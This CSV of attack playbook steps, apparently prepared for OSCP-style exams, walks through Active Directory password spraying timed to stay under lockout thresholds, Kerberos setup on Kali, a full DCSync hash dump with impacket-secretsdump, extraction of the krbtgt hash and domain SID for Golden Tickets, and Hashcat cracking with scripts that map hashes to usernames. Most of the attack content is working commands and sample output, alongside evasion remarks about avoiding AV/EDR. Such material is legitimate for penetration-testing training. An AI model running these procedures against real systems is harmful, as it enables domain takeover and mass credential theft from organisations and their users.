"id","name","objective","description","expected_output","notes"
"validate-round-1-creds","Validate Round 1 Found Credentials (If Any)","Immediately validate and leverage any credentials found in Round 1","IF VALID CREDENTIALS FOUND in Round 1: Don't wait for next round - immediately leverage them. VALIDATION: Use kerbrute-validate-creds or crackmapexec-validate-admin to confirm credentials work. DECISION POINT: (1) If credentials give local admin access (Pwn3d!) → proceed to lateral movement, objective achieved, spray chain can stop. (2) If credentials are standard user → use for AD enumeration (may find more attack vectors), then continue spray chain for additional credentials. (3) If no credentials found in Round 1 → proceed to wait-observation-window-1 step. TIME MANAGEMENT: If exam, evaluate: is local admin access sufficient for objective? Or need more credentials? Don't waste time spraying if objective is met.","",""
"wait-observation-window-1","Wait for Observation Window to Reset (Round 1 → 2)","Wait full observation window + buffer to ensure failed attempt counter resets","WAIT TIME: Observation window (from policy) + 5 minute buffer. Example: 30min + 5min = 35 minutes total. CRITICAL: Wait time is measured from LAST spray attempt completion (end of spray-round-1 step). Use timer app or alarm. DO NOT spray early - even 1 minute early could result in lockout if clocks are not synchronized. PRODUCTIVE USE OF WAIT TIME: (1) Validate credentials from Round 1 if found. (2) Enumerate AD with found credentials. (3) Perform non-password attacks (Kerberoasting, AS-REP roasting). (4) Search file shares for passwords. (5) Plan next password choices. (6) Review spray log for accuracy. WHEN TIMER EXPIRES: Proceed to spray-round-2. Update spray log to note observation window completion.","",""
"spray-round-2","Spray Round 2 - Second Password Attempt","Test second common password after observation window reset","VERIFY WAIT COMPLETE: Confirm timer expired and observation window + buffer elapsed. SELECT PASSWORD #2: Choose different password from Round 1. Examples: Welcome2023!, Summer2023!, Winter2023!, Company123! (vary by season, year, company name). EXECUTE SPRAY: Same method as Round 1 - kerbrute passwordspray -d domain.com --dc DC_IP users.txt 'Welcome2023!'. LOG RESULTS: Update spray log Password2_Time column with timestamps. Update Total_Attempts counter (should show 2 for all users now). Document any successful authentications. SET TIMER AGAIN: Start (observation window + buffer) timer for Round 2 → 3 transition. ALERT CHECK: Monitor for any lockout alerts or defensive responses. If any user locked out - ABORT spray chain immediately.","",""
"validate-round-2-creds","Validate Round 2 Found Credentials","Validate credentials from Round 2 and evaluate if additional rounds needed","IF CREDENTIALS FOUND in Round 2: Validate immediately with crackmapexec-validate-admin. Check for local admin rights. CUMULATIVE EVALUATION: Review credentials from Round 1 + Round 2. Questions: (1) Do you have local admin anywhere? (2) Do you have enough access for objectives? (3) Is additional spraying worth the time investment? DECISION MATRIX: [Local admin found] → Stop spray chain, proceed to lateral movement. [Multiple standard user accounts found] → Evaluate if enough for AD enumeration and Kerberoasting. [Zero credentials found] → Continue spray chain to Round 3. TIME BUDGET CHECK: Calculate remaining time and how many more rounds possible. Example: 60min left, 35min per round = 1 more round maximum.","",""
"wait-observation-window-2","Wait for Observation Window to Reset (Round 2 → 3)","Wait full observation window + buffer before Round 3","SAME PROCESS as wait-observation-window-1. Wait (observation window + buffer) minutes. CRITICAL ASSESSMENT: At this point you've invested 70+ minutes (2 spray rounds + 2 wait periods). Evaluate: (1) Is objective achievable with current access? (2) Is additional spraying worth remaining time? (3) Should pivot to other attack methods? ALTERNATIVE ATTACKS: Use wait time for: Kerberoasting (crack service account tickets offline), AS-REP roasting, ACL abuse hunting, GPP password searches, SMB share enumeration. SPRAY LOG REVIEW: Verify Total_Attempts column shows 2 for all users. Ensure no users accidentally sprayed 3 times (would risk lockout in Round 3).","",""
"spray-round-3","Spray Round 3 - Third Password Attempt (Final Safe Round)","Test third password - final round before reaching conservative safe limit","FINAL ROUND: With threshold-2 calculation, Round 3 is the LAST safe spray for threshold 5 (3 attempts). Do not proceed to Round 4 without re-evaluating risk. SELECT PASSWORD #3: Choose third distinct password. Examples: Spring2023!, Autumn2023!, Password1, Passw0rd!. EXECUTE SPRAY: kerbrute passwordspray with Password #3. LOG METICULOUSLY: Update spray log Password3_Time column. Total_Attempts should now be 3 for all users. This is AT the conservative safe limit. FINAL VALIDATION: Immediately validate any credentials found. Evaluate total credential haul: Round 1 + 2 + 3 results. DECISION POINT: Stop here (recommended) or risk Round 4 with reduced safety margin (threshold-1 instead of threshold-2).","",""
"final-validation-and-exploitation","Final Credential Validation and Exploitation","Consolidate all found credentials and execute optimal exploitation path","CONSOLIDATE RESULTS: Review spray log for all successful authentications from Rounds 1-3. VALIDATE ALL: Use crackmapexec-validate-admin to scan subnet with each credential pair. Create matrix: Username × Systems → show which users have admin on which systems. PRIORITIZE: (1) Credentials with most (Pwn3d!) systems = best pivot. (2) Credentials with server access (higher privilege data). (3) Credentials with no admin = use for AD enumeration. EXPLOITATION: Execute lateral movement to (Pwn3d!) systems, dump SAM/LSA/LSASS, extract additional credentials, search for Domain Admin cached creds or Kerberos tickets. OSCP SUCCESS: Local admin on any system is usually sufficient for initial foothold objective. Proceed to privilege escalation and post-exploitation.","",""
"optional-spray-round-4","Optional Round 4 - Higher Risk (Threshold-1)","Test fourth password with reduced safety margin if absolutely necessary","HIGH RISK - ONLY IF NECESSARY: Round 4 uses threshold-1 safety margin instead of threshold-2. Example: threshold 5 → 4 attempts (only 1 attempt buffer instead of 2). RISK ASSESSMENT: (1) Users might have failed login themselves = lockout. (2) Clock skew could cause timing issues = lockout. (3) Reduced margin for error. WHEN TO ATTEMPT: (1) Exam time running out and need credentials desperately. (2) High confidence that users haven't failed logins (monitoring). (3) Absolutely critical to test one more password. PROCESS: Same as previous rounds but with heightened monitoring. Watch for ANY lockout indicators. If single lockout detected - ABORT immediately. PASSWORD SELECTION: Choose highest probability password for final attempt. RECOMMENDATION: Generally NOT worth the risk. Stop at Round 3 unless absolutely critical.","",""
"configure-kerberos-kali","Configure Kerberos Client on Kali for AD Integration","Setup Kali Kerberos configuration to interact with Active Directory domain for ticket-based authentication","KERBEROS REQUIREMENT: Impacket Golden Ticket workflow requires proper Kerberos configuration for ticket validation and usage.

KERBEROS CONFIGURATION FILE: /etc/krb5.conf

BACKUP ORIGINAL CONFIG:
cp /etc/krb5.conf /etc/krb5.conf.bak

CREATE AD-SPECIFIC CONFIG:
sudo nano /etc/krb5.conf

REQUIRED CONFIGURATION:

[libdefaults]
    default_realm = CORP.COM
    dns_lookup_realm = false
    dns_lookup_kdc = true
    ticket_lifetime = 24h
    renew_lifetime = 7d
    forwardable = true
    rdns = false
    default_ccache_name = FILE:/tmp/krb5cc_%{uid}

[realms]
    CORP.COM = {
        kdc = dc01.corp.com
        admin_server = dc01.corp.com
        default_domain = corp.com
    }

[domain_realm]
    .corp.com = CORP.COM
    corp.com = CORP.COM

CONFIGURATION EXPLANATION:

[libdefaults]
- default_realm: Primary AD domain (UPPERCASE)
- dns_lookup_kdc: Auto-discover DCs via DNS SRV records (recommended)
- ticket_lifetime: TGT validity (24 hours standard)
- forwardable: Allow ticket forwarding for delegation
- rdns: Disable reverse DNS (avoid hostname resolution issues)

[realms]
- kdc: Domain Controller FQDN or IP
- admin_server: DC for administrative operations (same as kdc typically)

[domain_realm]
- Maps domain suffixes to Kerberos realms (LOWERCASE domain → UPPERCASE realm)

DNS CONFIGURATION (Required for dns_lookup_kdc):

Add DC as nameserver:
sudo nano /etc/resolv.conf

Add:
nameserver 192.168.50.1  # DC IP
search corp.com

OR (permanent via resolvconf):
sudo nano /etc/resolvconf/resolv.conf.d/head
nameserver 192.168.50.1

sudo resolvconf -u

VERIFY DNS RESOLUTION:
nslookup dc01.corp.com

Expected output:
Server:         192.168.50.1
Address:        192.168.50.1#53

Name:   dc01.corp.com
Address: 192.168.50.1

TEST KERBEROS CONFIGURATION:

Test ticket request (optional - requires valid credentials):
kinit administrator@CORP.COM
Password for administrator@CORP.COM: <enter password>

List tickets:
klist

Expected output:
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: administrator@CORP.COM

Valid starting       Expires              Service principal
11/23/2025 10:00:00  11/23/2025 20:00:00  krbtgt/CORP.COM@CORP.COM

DESTROY TEST TICKET:
kdestroy
(Removes test ticket - will create Golden Ticket later)

TIME SYNCHRONIZATION:

CRITICAL: Kerberos requires <5 minute time difference.

sudo ntpdate dc01.corp.com
OR
sudo rdate -n 192.168.50.1

Verify:
date
(Compare with DC time - must be within 5 minutes)

TROUBLESHOOTING:

Test Kerberos connectivity:
telnet dc01.corp.com 88
(Should connect - Kerberos port 88/tcp)

Check Kerberos logs:
sudo tail -f /var/log/auth.log
(Shows Kerberos authentication attempts and errors)

Common errors:
- KDC_ERR_C_PRINCIPAL_UNKNOWN: Wrong domain name or user doesn't exist
- KRB_AP_ERR_SKEW: Time synchronization issue (fix with ntpdate)
- Cannot resolve KDC: DNS issue (check /etc/resolv.conf)

FILE PERMISSIONS:

sudo chmod 644 /etc/krb5.conf
(Ensure readable by all users)

TIME ESTIMATE: 5-10 minutes.","",""
"dcsync-full-extraction-impacket","Execute Full DCSync from Kali with Impacket secretsdump","Extract all domain credentials including krbtgt hash using Impacket secretsdump entirely from Kali Linux","IMPACKET SECRETSDUMP: Python-based DCSync implementation - functionally identical to Mimikatz lsadump::dcsync but runs on Kali.

FULL DOMAIN DCSYNC COMMAND:
impacket-secretsdump -just-dc-ntlm '<DOMAIN>/<USERNAME>:<PASSWORD>@<DC_IP>' -outputfile domain_dump

Example:
impacket-secretsdump -just-dc-ntlm 'corp.com/dave:Password123!@192.168.50.1' -outputfile domain_dump

FLAGS EXPLANATION:
-just-dc-ntlm: Extract ONLY NTLM hashes (faster, smaller output)
  Alternative: -just-dc (includes Kerberos keys AES128/AES256 - slower, larger)
-outputfile domain_dump: Creates domain_dump.ntds file with all hashes

ALTERNATIVE: Use FQDN instead of IP (required for Kerberos auth):
impacket-secretsdump -just-dc-ntlm 'corp.com/dave:Password123!@dc01.corp.com' -outputfile domain_dump

OUTPUT (Real-time console):
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a9b30e5b0dc865eadcea9411e4ade72d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a9b30e5b0dc865eadcea9411e4ade72d:::
              ^^^ THIS IS GOLDEN TICKET KEY - CRITICAL TO SAVE
dave:1104:aad3b435b51404eeaad3b435b51404ee:08d7a47a6f9f66b97b1bae4178747494:::
sqlsvc:1125:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
<...hundreds to thousands more users...>
[*] Cleaning up...

OUTPUT FILE (domain_dump.ntds):
cat domain_dump.ntds

Format: username:RID:LM_hash:NTLM_hash:::
(Identical format to Windows Mimikatz output - cross-platform compatible)

CRITICAL DATA EXTRACTION:

(1) KRBTGT HASH (For Golden Ticket):
grep 'krbtgt:' domain_dump.ntds

Output:
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a9b30e5b0dc865eadcea9411e4ade72d:::

Extract just the NTLM hash:
grep 'krbtgt:' domain_dump.ntds | cut -d ':' -f 4

Result: a9b30e5b0dc865eadcea9411e4ade72d

Save to variable:
KRBTGT_HASH=$(grep 'krbtgt:' domain_dump.ntds | cut -d ':' -f 4)
echo $KRBTGT_HASH

(2) DOMAIN SID (For Golden Ticket):

Domain SID appears in secretsdump output as:
[*] Domain SID: S-1-5-21-1234567890-1234567890-1234567890

Extract from secretsdump console output OR query separately:
impacket-lookupsid 'corp.com/dave:Password123!@192.168.50.1' | grep ""Domain SID""

Output:
[*] Domain SID: S-1-5-21-1234567890-1234567890-1234567890

Save to variable:
DOMAIN_SID=""S-1-5-21-1234567890-1234567890-1234567890""
echo $DOMAIN_SID

(3) HIGH-VALUE USER HASHES:

Domain Admins:
grep -i 'administrator\|admin' domain_dump.ntds > admin_hashes.txt

Service accounts:
grep -iE 'svc|sql|web|backup|service' domain_dump.ntds > service_hashes.txt

EXTRACT NTLM HASHES FOR HASHCAT:
cut -d ':' -f 4 domain_dump.ntds > ntlm_hashes.txt

Verify:
head -5 ntlm_hashes.txt

Expected output:
a9b30e5b0dc865eadcea9411e4ade72d
31d6cfe0d16ae931b73c59d7e0c089c0
08d7a47a6f9f66b97b1bae4178747494
<...pure NTLM hashes...>

wc -l ntlm_hashes.txt
(Shows total user count extracted)

EXTRACTION STATISTICS:

echo ""[*] DCSync Statistics:""
echo ""Total users extracted: $(wc -l < domain_dump.ntds)""
echo ""krbtgt hash: $KRBTGT_HASH""
echo ""Domain SID: $DOMAIN_SID""
echo ""Admin accounts: $(wc -l < admin_hashes.txt)""
echo ""Service accounts: $(wc -l < service_hashes.txt)""

OPSEC IMPACT (Same as Windows Mimikatz):

- EventID 4662 for each user extracted (hundreds to thousands)
- DRSUAPI replication traffic from non-DC IP (Kali IP)
- Large data transfer (500MB-1GB for large domains)
- Blue team detection: Unusual replication source, sustained replication activity

TIME ESTIMATES:
- Small domain (50-500 users): 2-5 minutes
- Medium domain (500-2000 users): 5-15 minutes
- Large domain (2000-10000 users): 15-60 minutes

FAILURE SCENARIOS:

- ERROR_ACCESS_DENIED: Insufficient replication rights (need DA or DCSync permissions)
- Connection timeout: Network instability or DC offline
- KRB_AP_ERR_SKEW: Time sync issue (run sudo ntpdate dc01.corp.com)
- Cannot resolve DC FQDN: DNS configuration issue (check /etc/resolv.conf)

FAILURE RECOVERY:

If DCSync interrupted:
- Partial results saved to domain_dump.ntds (keep file)
- No resume capability - must restart full extraction
- Consider targeted extraction if full dump repeatedly fails

ADVANTAGES OVER WINDOWS WORKFLOW:

- No AV/EDR bypass needed (Mimikatz triggers every AV)
- No RDP latency (direct Kali terminal execution)
- No file transfers (hashes already on Kali for Hashcat)
- Consistent Python-based toolchain (Impacket suite uniformity)

TIME ESTIMATE: 5-20 minutes (domain size dependent).","",""
"crack-hashes-kali","Batch Crack NTLM Hashes on Kali with Hashcat","Recover plaintext passwords from extracted NTLM hashes using Kali-based Hashcat cracking","KALI HASHCAT CRACKING: Same process as Windows-based cracking but entirely on Kali (no file transfers needed).

HASHCAT MODE 1000: NTLM hash cracking

VERIFY HASHCAT INSTALLATION:
hashcat --version
(Should show v6.2.x or higher on Kali)

ATTACK PHASE 1: STRAIGHT DICTIONARY (Baseline - 1-5 minutes)
hashcat -m 1000 -a 0 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt --force

--force: Required on Kali VM (suppresses OpenCL warnings)

Expected: 15-25% crack rate (common weak passwords)

ATTACK PHASE 2: RULE-BASED ATTACK (Primary - 10-30 minutes)
hashcat -m 1000 -a 0 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

Rule transformations:
- password → Password, PASSWORD, password1, password123, p@ssw0rd, etc.

Expected: 30-50% crack rate (corporate password patterns)

ATTACK PHASE 3: CUSTOM WORDLIST (Organization-specific - 5-10 minutes)

Create custom wordlist:
echo -e ""Corp\nCorporation\nCompanyName\nWelcome\nPassword\n2023\n2024"" > /tmp/custom.txt

Crack with rules:
hashcat -m 1000 -a 0 ntlm_hashes.txt /tmp/custom.txt -r /usr/share/hashcat/rules/best64.rule --force

Expected: Additional 10-20% crack rate

MONITOR CRACKING PROGRESS:

Press 's' during cracking:
Speed.........: 500.0 MH/s (GPU) OR 50.0 MH/s (CPU)
Recovered.....: 847/2450 (34.57%) Digests
Progress......: 14344384/14344384 (100.00%)

VIEW CRACKED PASSWORDS:
hashcat -m 1000 ntlm_hashes.txt --show

Output (hash:password format):
a9b30e5b0dc865eadcea9411e4ade72d:Password123!
08d7a47a6f9f66b97b1bae4178747494:Welcome2023
8846f7eaee8fb117ad06bdd830b7586c:SQLPass2023
<...hundreds more...>

MAP HASHES TO USERNAMES:

Create username:password credential file:
while read line; do
  hash=$(echo $line | cut -d ':' -f 1)
  pass=$(echo $line | cut -d ':' -f 2-)
  user=$(grep ""$hash"" domain_dump.ntds | cut -d ':' -f 1)
  if [ -n ""$user"" ]; then
    echo ""$user:$pass""
  fi
done < <(hashcat -m 1000 ntlm_hashes.txt --show) > credentials.txt

Result (credentials.txt):
Administrator:Password123!
dave:Welcome2023
sqlsvc:SQLPass2023
webadmin:IIS2023Web!
backup_admin:Backup1!
<...username:password pairs...>

PRIORITIZE RESULTS:

Domain Admins cracked:
grep -f <(net rpc group members ""Domain Admins"" -U 'dave%Password123!' -I 192.168.50.1 2>/dev/null) credentials.txt > domain_admins_cracked.txt

Alternative (if net rpc unavailable):
grep -iE 'administrator|admin' credentials.txt > admin_creds.txt

Service accounts cracked:
grep -iE 'svc|sql|web|backup|service' credentials.txt > service_creds.txt

UNCRACKED HASHES (Still usable for PTH):

Identify uncracked hashes:
comm -23 <(cut -d ':' -f 4 domain_dump.ntds | sort) <(hashcat -m 1000 ntlm_hashes.txt --show | cut -d ':' -f 1 | sort) > uncracked_hashes.txt

Map to usernames:
for hash in $(cat uncracked_hashes.txt); do
  grep ""$hash"" domain_dump.ntds
done > uncracked_users.txt

Format: username:RID:LM:NTLM::: (ready for PTH)

CRACKING STATISTICS:

Generate summary:
echo ""=== Hashcat Cracking Summary ===""
echo ""Total hashes: $(wc -l < ntlm_hashes.txt)""
echo ""Cracked: $(hashcat -m 1000 ntlm_hashes.txt --show | wc -l)""
echo ""Crack rate: $(hashcat -m 1000 ntlm_hashes.txt --show | wc -l) / $(wc -l < ntlm_hashes.txt) * 100 | bc)%""
echo ""Uncracked: $(wc -l < uncracked_hashes.txt)""
echo """"
echo ""High-value accounts cracked:""
grep -iE 'administrator|admin|da_' credentials.txt | wc -l

KALI-SPECIFIC OPTIMIZATIONS:

CPU vs GPU:
- Kali VM (no GPU): Use --force flag, expect ~50 MH/s
- Physical Kali with GPU: Much faster (~500-5000 MH/s depending on GPU)
- Check device: hashcat -I (lists OpenCL devices)

Memory issues (large hash files):
- Split ntlm_hashes.txt into batches:
split -l 1000 ntlm_hashes.txt hash_batch_

- Crack each batch:
for batch in hash_batch_*; do
  hashcat -m 1000 -a 0 $batch /usr/share/wordlists/rockyou.txt --force
done

KALI WORDLISTS:

Default location: /usr/share/wordlists/
- rockyou.txt (14M passwords - standard)
- /usr/share/seclists/Passwords/ (additional lists)
- /usr/share/wordlists/kaonashi.txt (if installed)

Decompress rockyou:
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
(If not already decompressed)

TIME ESTIMATE: 15-60 minutes (Phase 1-2 attacks, sufficient for exam).","",""
